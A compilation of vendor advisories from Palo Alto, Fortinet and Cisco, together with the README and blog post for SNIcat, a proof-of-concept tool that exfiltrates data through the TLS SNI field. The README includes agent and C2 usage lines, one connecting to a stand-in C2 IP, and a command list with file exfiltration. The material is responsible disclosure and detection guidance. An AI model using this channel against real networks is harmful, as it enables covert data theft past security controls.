### Description

When SSL/TLS Forward Proxy Decryption mode has been configured to decrypt the web transactions, the PAN-OS URL filtering feature inspects the HTTP Host and URL path headers for policy enforcement on the decrypted HTTPS web transactions but does not consider Server Name Indication (SNI) field within the TLS Client Hello handshake.

This allows a compromised host in a protected network to evade any security policy that uses URL filtering on a firewall configured with SSL Decryption in the Forward Proxy mode. A malicious actor can then use this technique to evade detection of communication on the TLS handshake phase between a compromised host and a remote malicious server.

This technique does not increase the risk of a host being compromised in the network. It does not impact the confidentiality or availability of a firewall. This is considered to have a low impact on the integrity of the firewall because the firewall fails to enforce a policy on certain traffic that should have been blocked.

This issue does not impact the URL filtering policy enforcement on clear text or encrypted web transactions.

This technique can be used only after a malicious actor has compromised a host in the protected network and the TLS/SSL Decryption feature is enabled for the traffic that the attacker controls.

Palo Alto Networks is not aware of any malware that uses this technique to exfiltrate data.

This issue is applicable to all current versions of PAN-OS.

This issue does not impact Panorama or WF-500 appliances.

This issue does not impact PAN-OS appliances running PAN-OS 10.1 (and later versions of PAN-OS) when CTD inspection is enabled in the appliance configuration.

### Product Status

| Versions | Affected | Unaffected |
| PAN-OS 10.1 | All without CTD inspection enabled | None with CTD inspection enabled |
| PAN-OS 10.0 | All | None |
| PAN-OS 9.1 | All | None |
| PAN-OS 9.0 | All | None |
| PAN-OS 8.1 | All | None |

### Required Configuration for Exposure

This URL filtering policy evasion situation is only applicable when the following conditions are true:

1. A host in the network is already compromised by a malicious actor.

2. The PAN-OS configuration must have the SSL/TLS Decryption Forward Proxy feature enabled for the specific traffic that the attacker controls.

3. There is no other security device in the chain that performs URL Filtering or can block access to malicious URLs or IP-addresses on the encrypted SSL/TLS traffic.

PAN-OS appliances running PAN-OS 10.1 (and later versions of PAN-OS) with CTD inspection enabled are not impacted by this vulnerability.

### Severity: LOW

CVSSv3.1
Base Score:
3 ([CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:L/A:N](https://cvssjs.github.io/#CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:L/A:N))

### Exploitation Status

Palo Alto Networks is not aware of any malware that uses this technique to exfiltrate data.

### Weakness Type

[CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20 "More at https://cwe.mitre.org/data/definitions/20")

### Solution

Palo Alto Networks is currently working to improve our inspection engines by adding a URL filtering policy check on both the TLS SNI field and the HTTP Host and URL headers for decrypted HTTPS transactions.

If your appliance is using PAN-OS 10.1 (or a later version of PAN-OS), enabling CTD inspection removes the security impact of this issue.

You can enable CTD inspection from the CLI with the following command:

set deviceconfig setting ssl-decrypt scan-handshake yes

You can enable CTD inspection from the web management interface through the following menu:

Device > Setup > Session > Decryption Settings > SSL Decryption Settings > Send handshake messages to CTD for inspection

If using other impacted PAN-OS appliances, or unable to enable CTD inspection in appliances using PAN-OS 10.1 (or later versions of PAN-OS), apply any of the workarounds to completely mitigate the risk of evasion.

There are currently no other PAN-OS updates available for this issue.

### Workarounds and Mitigations

Customers concerned about the risk described in this advisory are encouraged to review the KB article <https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u0000008V4J> for more information on background and mitigation options. To enforce URL filtering policy on TLS handshakes for decrypted HTTPS sessions, we suggest you use any one of the following workarounds:

1. Route outbound traffic between two virtual systems (vsys) on PAN-OS firewalls that have vsys capability and perform URL Filtering on one vsys and perform SSL/TLS Decryption on the other vsys.

2. Add two additional Security Zones and route outbound traffic between the two zones so that you can apply both "Decrypt" and "No Decrypt" Decryption policy rules. For example, configure your next-generation firewall so that traffic travels from the Inside zone to the Internal-DMZ zone where you applied a “No Decrypt” rule along with URL Filtering and then the traffic passes to the External-DMZ zone and from External-DMZ to the Internet zone where you applied a "Decrypt" rule. Be aware that this workaround configuration may significantly increase the load on your firewall.

3. Use the additional security device in the traffic chain.

The SSL/TLS Decryption and URL Filtering functions should be separated (for example, the first device is performing URL Filtering and the second device is performing SSL/TLS Decryption).

These workarounds are described in detail at <https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u0000008V4J>

We recommend you use an endpoint protection solution such as the Cortex XDR agent to significantly reduce the potential risk of hosts being compromised. See <https://www.paloaltonetworks.com/cortex/endpoint-protection>.

Caution: We recommend that you do not disable SSL/TLS Decryption as a workaround to this issue. There are additional risks associated with this action.

# SNIcat (Server Name Indication Concatenator)

[![SNIcat](/mnemonic-no/SNIcat/raw/master/images/snicat-logo.png)](/mnemonic-no/SNIcat/blob/master/images/snicat-logo.png)

**SNIcat** is a proof of concept tool that performs data exfiltration, utilizing a covert channel method via. *Server Name Indication*, a **TLS Client Hello Extension**.
The tool consists of an **agent** which resides on the compromised internal host, and a **Command&Control** Server which controls the agent and gathers exfiltrated data.

The full story behind SNIcat can be found in our [blog post](https://www.mnemonic.no/blog/introducing-snicat)

## Disclaimer

SNIcat has been tested on macOS and a variety of linux distributions.
Even though it can be easily ported, there is currently no Windows version, as this is just a PoC tool.

The exfiltration method does not work with explicit proxies, due to the use of HTTP CONNECT, and not TLS Client Hello, when connecting via an explicit proxy.

SNIcat might not work with products and software versions that we haven’t tested, but that does not mean the products and/or software versions aren’t vulnerable.

## SNIcat in action

[![](/mnemonic-no/SNIcat/raw/master/images/snicat.gif)](/mnemonic-no/SNIcat/blob/master/images/snicat.gif)

## Background and Scenario

We discovered a new stealthy method of data exfiltration that specifically bypasses security perimeter solutions such as web proxies, next generation firewalls (NGFW), and dedicated solutions for TLS interception and inspection. Our testing validates that this is a widespread issue that affects different types of security solutions as well as solutions from a variety of vendors. We successfully tested our technique against products from Cisco, F5 Networks, Palo Alto Networks and Fortinet, and speculate that many other vendors also are susceptible.

By using our exfiltration method SNIcat, we found that we can bypass a security perimeter solution performing TLS inspection, even when the Command & Control (C2) domain we use is blocked by common reputation and threat prevention features built into the security solutions themselves. In short, we found that solutions designed to protect users, introduced them to a new vulnerability.

We have also provided a [Suricata signature](/mnemonic-no/SNIcat/blob/master/signatures/snicat.rules) for detecting this specific tool.

## Installation

Clone the repository:

```
https://github.com/mnemonic-no/SNIcat.git
```

Install dependencies:

```
pip3 install -r requirements.txt --user
```

## Initial setup

**C2**

Aquire a wildcard certificate and key from a publically trusted CA. This represents the *GOOD\_CERT* and *GOOD\_CERT\_KEY*.

Utilise a self-signed certificate and key (not in any trust store) as a *BAD\_CERT* and *BAD\_CERT\_KEY*.

```
(*) USAGE:      'python3 snicat_c2.py <LISTENING_PORT> <GOOD_CERT> <GOOD_CERT_KEY> <BAD_CERT> <BAD_CERT_KEY> log={on|off}'
(*) EXAMPLE:    'python3 snicat_c2_final.py 443 certs/good.pem certs/good.key certs/ssl-cert-snakeoil.pem log=off'

```

**Agent**

```
(*) USAGE:      'python3 snicat_agent.py <C2_SERVER_IP> <C2_SERVER_PORT> log={on|off}'
(*) Example:    'python3 snicat_agent.py 192.0.2.1 443 log=off'

```

## Usage

C2 Available commands

```
LIST			 - 	display all content in current folder
LS			 - 	display only files in the currenet folder
SIZE			 - 	display size of files in the currenet folder
LD			 - 	display every directory in current folder
CB			 - 	moves down to root tree folder - similar to 'cd .. '
CD <folder-id> 		 - 	moves up the specified folder
EX <file-id> 		 - 	exfiltrate the specified file
ALIVE 			 - 	check alive/dead agent
EXIT 			 - 	quit the C2 server

```

# Bypassing FortiGate security profiles via SNI in Client Hello

### Summary

An exposure of sensitive information to an unauthorized actor vulnerability [CWE-200] in FortiOS may allow a privileged attacker to disclose sensitive information via SNI Client Hello TLS packets.

### Affected Products

All FortiOS versions are impacted by this vulnerability.

### Solutions

Given that there is no systematic way to detect **all** exfiltration attempts and to exhaustively enumerate all possibilities offered by exfiltration channels, Fortinet has addressed the issue by releasing a set of IPS signatures:
1. Python/SNICat.A!exploit <https://www.fortiguard.com/encyclopedia/virus/10069638>
2. SNIcat.Data.Exfiltration.Tool <https://www.fortiguard.com/encyclopedia/ips/50952>

This vulnerability is due to inadequate inspection of the Server Name Identification (SNI) header in the SSL/TLS handshake. An attacker could exploit this vulnerability by using data from the TLS client hello packet to communicate with a blocked external server. A successful exploit could be used to exfiltrate data from a protected network. The attacker must compromise a host on the network to exfiltrate the sensitive data.  The following Snort rule can be used to detect possible exploitation of this vulnerability: Snort SID 58062.  There are no workarounds that address this vulnerability.  This advisory is available at the following link:<https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sni-data-exfil-mFgzXqLN>  Affected Products  * Vulnerable Products At the time of publication, this vulnerability affected all open source Snort project releases earlier than Release 2.9.18. For more information about open source Snort, see the [Snort website](https://www.snort.org/).  At the time of publication, this vulnerability affected the following Cisco products if they were configured with the SSL/TLS decryption option and were also using web reputation or URL filtering features:    + 3000 Series Industrial Security Appliances (ISAs)   + 4000 Series Integrated Services Routers (ISRs) (except 4321 ISRs)   + Catalyst 8000V Edge Software   + Catalyst 8200 Series Edge Platforms   + Catalyst 8300 Series Edge Platforms   + Cloud Services Router 1000V Series (CSR 1000V)   + Firepower Threat Defense (FTD) Software, if the SSL/TLS decryption option is enabled   + Integrated Services Virtual Router (ISRv)   + Web Security Appliance (WSA), both physical and virtual devices, deployed in transparent mode For information about which Cisco software releases were vulnerable at the time of publication, see the [Fixed Software](#fs) section of this advisory. See the Details section in the bug ID(s) at the top of this advisory for the most complete and current information. Additional Considerations for FTD For an FTD device to be vulnerable, at least one SSL decryption policy must be enabled. As a prerequisite, an SSL decryption policy must be associated with a running access control policy.  **Determine Whether an SSL Decryption Policy Is Enabled on Cisco FTD Software**  There are two methods for determining whether an SSL decryption policy is enabled:  *Option 1: Use the CLI*  Use the **show ssl-policy-config** CLI command to verify whether an SSL decryption policy is enabled on a device. The following example shows the output of the **show ssl-policy-config** command on a device that does *not* have an SSL policy configured and is *not* vulnerable:  ```   > show ssl-policy-configSSL policy not yet applied.   ```  Any other output returned by the **show ssl-policy-config** command indicates that an SSL policy is configured and the device is vulnerable.  For more information about the **show ssl-policy-config** command, see the [Cisco Firepower Threat Defense Command Reference](https://www.cisco.com/c/en/us/td/docs/security/firepower/command_ref/b_Command_Reference_for_Firepower_Threat_Defense/s_8.html#wp8230585640).  *Option 2: Use the GUI*  To determine whether an SSL decryption policy is enabled on a device, check the appropriate policy:    + For devices managed by [Firepower Management Center (FMC)](https://www.cisco.com/c/en/us/td/docs/security/firepower/660/configuration/guide/fpmc-config-guide-v66/getting_started_with_ssl_policies.html#ID-2253-00000021): **Policies > Access Control > SSL**   + For devices managed by [Firepower Device Manager (FDM)](https://www.cisco.com/c/en/us/td/docs/security/firepower/660/fdm/fptd-fdm-config-guide-660/fptd-fdm-ssl-decryption.html#task_A46EB67387764C209439122818AB7B43): **Policies > SSL Decryption**Additional Considerations for WSA For a WSA device to be vulnerable, the HTTPS Proxy feature must be enabled and at least one decryption policy must be configured. The HTTPS Proxy feature is disabled by default.  To determine whether the HTTPS Proxy feature is enabled for a WSA, administrators can log in to the web interface of the WSA and navigate to **Security Services > HTTPS Proxy**. The value in the **HTTPS Proxy** field indicates whether the feature is enabled or disabled. Products Confirmed Not Vulnerable Only products listed in the [Vulnerable Products](#vp) section of this advisory are known to be affected by this vulnerability.  The following products either already inspect the SNI header, do not perform SSL/TLS inspection, or do not use any web reputation or URL filtering feature to detect malicious web domains that could be used as recipients for data exfiltration. Therefore, Cisco has confirmed that these products are not affected by this vulnerability:    + 1000 Series ISRs   + 4321 ISRs   + Adaptive Security Appliance (ASA) Software   + Catalyst 8500 Series Edge Platforms   + Firepower Management Center (FMC) Software   + Meraki security appliances, all models   + Open source Snort 3   + Umbrella  Details  * Using SNIcat or a similar tool, a remote attacker could exploit this vulnerability by sending sensitive data to an arbitrary server, hiding it in the SNI header of the TLS client hello packet. This vulnerability does not provide a means for an attacker to obtain the data in the first place; the attacker must have already compromised a host in a protected network to use for collecting and exfiltrating the confidential information.  This advisory describes a filter bypass technique that could be used to circumvent protections that are based on web reputation filters, URL filtering, and threat detection. There is not a simple and deterministic way to identify every instance of data exfiltration because attackers may obfuscate the leaked data and use arbitrary, nonmalicious domains as recipients. However, Cisco is currently working to develop a solution that would extend the web reputation, URL filtering, or threat inspection features to the SNI header. This fix will mitigate this attack in cases where destination servers have a poor reputation or are already explicitly blocked by the administrators. This advisory will be updated once this solution becomes available.  In the meantime, to detect and mitigate any attack performed with the SNIcat tool, Cisco has released a Snort rule with the SID 58062. To ensure full protection, the action for the rule should be set to **Block**.  Workarounds  * For potential workarounds on a specific Cisco product, refer to the Description section in the bug ID(s) at the top of this advisory.  Fixed Software  * When [considering software upgrades](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#fixes), customers are advised to regularly consult the advisories for Cisco products, which are available from the [Cisco Security Advisories page](https://www.cisco.com/go/psirt), to determine exposure and a complete upgrade solution.

*Updated 19.08.2021: mnemonic's Morten Marstrander and Alvaro Gutierrez successfully tested SNIcat on Cisco WSA. Cisco has [released an advisory](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sni-data-exfil-mFgzXqLN), stating that multiple products are vulnerable to SNIcat, including WSA, FTD, ISAs and some versions of Snort.*

*Update 08.10.2020: After publishing, the researchers have been invited to present these findings at Black Hat Europe, read more [here](https://www.blackhat.com/eu-20/briefings/schedule/index.html#circumventing-the-guardians-how-the-security-features-in-state-of-the-art-tls-inspection-solutions-can-be-exploited-for-covert-data-exfiltration-21286).*

## TL;DR

This blog post describes how we discovered a new stealthy method of data exfiltration that specifically bypasses network security solutions such as web proxies, next generation firewalls (NGFW), and dedicated solutions for TLS interception and inspection. Our testing validates that this is a widespread issue that affects different types of security solutions as well as solutions from a variety of vendors. We successfully tested our technique against products from F5 Networks, Palo Alto Networks and Fortinet, and speculate that many other vendors also are susceptible.

By using our exfiltration method *SNIcat*, we found that we can bypass a security solution performing TLS inspection, even when the Command & Control (C2) domain we use is blocked by common reputation and threat prevention features built into the security solutions themselves. In short, we found that solutions designed to protect users, introduced them to a new vulnerability.

We have also developed mitigation techniques, including signatures available for download, as described below.

## Auditing the guardians

For many years both of us have designed security architecture around network man-in-the-middle devices such as web proxies, firewalls and load balancers. This playground often piques our curiosity, and this time it made us want to look at a few solutions from an attacker’s perspective.

We decided to investigate how network security solutions handled the TLS’ Server Name Indication (SNI) field for categorising and blocking bad URLs/hostnames (more on the SNI field later). Our initial goal was to simply test if we could bypass these security solutions by inserting a legitimate hostname in the SNI field and sending the traffic to a domain categorised as a bad domain.

However, this didn’t pan out as all the security solutions we tested verified that the subject-cn of the server certificate matched the value in the SNI sent by the client. If it didn’t match, the traffic was blocked. It was worth trying, at least.

This initial experiment made us aware that the TLS Client Hello packet always reached the destination server, even if it was categorised as a bad URL/domain by the security solution. The solution only blocked the session **after** the TLS handshake had been completed, but not earlier.

We then decided to play with the idea that we could leverage this unidirectional stream to exfiltrate data and bypass network security features, and therefore be able to send data to a known bad domain/host.

## Decryption mirrors or Funhouse mirrors?

Modern network security solutions that perform TLS inspection often have a functionality called *decryption mirroring*. Basically, the security solution can forward a copy of the decrypted traffic to a mirror port, which is commonly connected to an IDS that can now inspect the once encrypted traffic. This is all well and good from a security monitoring perspective. However, we discovered that devices connected to the mirror port do not receive the TLS handshake at all, opening up a new way of performing stealthy exfiltration utilising the TLS Client Hello.

## 'I don't know why you say goodbye, I say Hello' - A digression on the TLS Hello packet

Because of the way the security solutions described above behaved, we realised that we could exfiltrate data utilising extensions of the Client Hello of the TLS protocol. We chose the SNI field as an exfiltration container because it was the one extension that was never manipulated or changed by any of the in-line security solutions.

During the handshake process, the SNI is populated by a value provided by the client and instructs the server which hostname the client is trying to connect to, and what certificate it should present to the client.

When utilising a security solution to actively allow or deny traffic based on what domain/URL the client is connecting to, this is usually how it works:

![Diagram on how SNI works](/globalassets/images/blog/snicat/sni-figure-blog.jpg?w=1600)

We then conducted a quick proof of concept which proved we could misuse this field by injecting arbitrary data and successfully employing this once legitimate extension as a “smuggling container” through the security solutions, without the traffic being copied to a decryption mirror port.

So far so good. We had demonstrated how we could send data out from a client. The next step was to find a way to control the client using a RAT (Remote Access Trojan) that could, in turn, leverage this new communication channel. As mentioned earlier, at this stage of testing the channel was only working one-way since every tested solution was blocking the returning traffic coming back from the server and that was obviously not an optimal scenario. We were stuck, and in need of a new way of letting the control server’s data pass back through the security solution.

## Commands, but who controls them?

To overcome this hurdle, we built an interim out of band C2 based on Instagram, which employed embedded C2 control commands inside Instagram’s own comments section. This was enough to get a working demo which proved our theory correct, functional and hopefully extensible: we were able to remotely control the compromised host and selectively exfiltrate data.

This result encouraged us to continue testing. Our next goal was to replace the Instagram component since social media websites are easily and often blocked by internal security policies, which would have interfered with our C2 communication. We continued pursuing an in-band alternative of establishing an end-to-end communication between the agent and the Command & Control server.

After some more tinkering, we discovered a common denominator in every solution we tested. As long as the server presents a valid and trusted certificate during the TLS handshake, the security solution will always present an emulated version of that certificate to the client, signed by the solution’s built-in CA. This behaviour occurs even if the domain used is blacklisted by a reputation database (URL/domain categorisation). In addition, by serving a self-signed certificate from a server, the security solution either presents the client with an emulated self-signed certificate, or a simple TCP reset.

On a very primitive communication channel, a basic response would only require a binary YES/NO capability, and we now have it: a valid, trusted certificate gives us a “YES”, and an untrusted, self-signed certificate gives us “NO”. We implemented this logic into our SNIcat tool.

## Putting it all together – enter SNIcat

SNIcat comprises of two separate but interdependent components:

* A passive agent that should be dropped on the target and already compromised host. Its only goal is to connect back to the C2 and execute the provided commands.
* A C2 server which controls the agent from anywhere on the Internet.

The passive agent is equipped with various commands, including the ability to exfiltrate (i.e. upload) files to the server. It constantly loops between all the available commands and waits for the C2 server to select the desired one by leveraging the binary YES/NO capability mentioned earlier. With SNIcat, we extended this logic so that we could provide a minimal but effective standalone Command Line Interface (CLI). The CLI can offer basic file system navigation commands such as jumping between folders, listing files and, obviously, exfiltration.

Here is the C2 CLI in action, where we use some of the built-in commands to navigate the file system and exfiltrate a file from the agent to the C2 server:

## **What about mitigations?**

While developing this offensive tool, we also worked on developing different ways to mitigate and detect this kind of attack, both from the endpoint and the security perimeter solution. We have had a good dialogue with the vendors whose products we tested, and the following suggestions have been shared with them. As a result, a few of the vendors have provided their own security advisory with their suggested work-arounds and/or fixes. Links to the advisories can be found in our reference section below.

### Detection in the security perimeter

1. An Intrusion Detection System (IDS) could detect the anomalous SNI payload by redirecting the original TLS handshake, along with the decrypted traffic or as a separate stream, to any device configured to receive decrypted traffic (often called *decryption mirroring*).
2. Performing heuristics on the Client Hello’s SNI: We have successfully used custom logic to perform an entropy check on the SNI field, and detect SNIcat by utilising this method. As long as the vulnerable products can log the SNI of every handshake, send it to a SIEM, or send the handshake itself to an IDS, one can detect SNIcat with good accuracy. Another mitigation we suggest is to reuse existing exfiltration signatures, such as DNS-signatures, on the SNI field. Also, by checking the length of the SNI field, one could check that it’s almost always 254 bytes during our misuse attacks (this is the maximum we were able to send per Client Hello, due to the limitations of a domain name character length). An alert could be generated when this value is matched.
3. Before completing the server side’s TLS handshake, we recommend changing the blocked URL categories’ logic to match the SNI field and thus block/allow any session in case of a match occurring. This way the data in the malicious SNI will not be passed to the C2 if the site is already restricted by a *blocked* URL category or if it is not matching an explicit whitelist.

### Detection on the Endpoint

We also developed a very early-stage proof of concept of a ‘passiveSNI’ detection tool, conceptually similar to the well-known PassiveDNS application.

It works by constantly monitoring and logging every TLS/Hello packet sent through any network socket interface. These generated logs can be gathered and analysed through a SIEM solution against any well-known signature or behavioural analytics.

## Conclusions

We speculate that more vendors than those mentioned in this blog post are susceptible to our SNIcat approach. Even though it would have been interesting to test every network security solution on the market, we had limited resources and scope this time around. We therefore advise vendors to test if their products are vulnerable to SNIcat. In addition, end users and enterprises may find it helpful to test their solutions with our PoC code that you can find on [GitHub](https://github.com/mnemonic-no/SNIcat).
